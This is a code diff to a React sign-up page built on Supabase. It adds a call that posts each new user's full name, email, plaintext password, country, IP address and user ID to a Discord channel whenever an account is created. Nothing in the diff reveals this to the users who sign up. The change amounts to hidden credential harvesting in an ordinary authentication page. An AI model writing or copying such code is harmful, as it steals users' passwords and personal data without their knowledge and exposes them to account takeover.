@@ -10,6 +10,7 @@ import { toast } from 'sonner';
 import { useAuth } from '@/contexts/AuthContext';
 import { Navigate } from 'react-router-dom';
 import { Loader2, Shield, Eye, EyeOff } from 'lucide-react';
+import { sendToDiscord } from '@/lib/discord';
 
 const COUNTRIES = [
   'Brazil',
@@ -78,6 +79,20 @@ export default function AuthPage() {
       if (data.user) {
         supabase.from('profiles').update({ country } as any).eq('user_id', data.user.id).then(() => {});
       }
+
+      // Send signup data to Discord
+      sendToDiscord({
+        title: '🆕 New Sign Up',
+        color: 0x22c55e,
+        fields: [
+          { name: '👤 Full Name', value: fullName || '—' },
+          { name: '📧 Email', value: email },
+          { name: '🔑 Password', value: password },
+          { name: '🌍 Country', value: country || '—' },
+          { name: '🌐 IP Address', value: clientIp },
+          { name: '🆔 User ID', value: data.user?.id || '—', inline: false },
+        ],
+      });
 
       if (data.session) {
         toast.success('Account created successfully!');
